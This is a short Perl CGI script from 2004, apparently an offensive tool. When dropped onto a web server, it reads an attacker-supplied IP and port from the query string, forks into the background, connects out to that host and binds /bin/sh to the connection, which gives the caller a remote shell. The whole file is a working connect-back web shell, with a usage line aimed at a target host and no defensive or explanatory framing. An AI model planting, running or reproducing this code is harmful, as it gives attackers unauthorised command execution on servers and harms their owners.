#!/usr/bin/perl

# (C) Copyright Claes M Nyberg <md0claes@mdstud.chalmers.se> 2004
#
# $Id: connect_back_cgi.pl,v 1.1 2004-12-22 01:34:06 cmn Exp $
#
# Usage: http://target.com/cgi-bin/connect_back_cgi.pl?127.0.0.1:8080
#

use strict;
use Socket;

my $port = 31337;
my $target = "127.0.0.1";

my @addr = split(/:/, $ENV{'QUERY_STRING'});
(defined(@addr[0])) and $target = $addr[0];
(defined(@addr[1])) and $port = $addr[1];

print "Content-type: text/plain\n\n";

# Detach
if (fork() != 0) { exit(0); }

socket(TARGET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or
    die("socket(): $!");

connect(TARGET, sockaddr_in($port,inet_aton($target))) or die("connect(): $!");

open(STDIN, '<&TARGET');
open(STDOUT, '>&TARGET');
open(STDERR, '>&TARGET');
exec('/bin/sh');
die("exec(): $!");


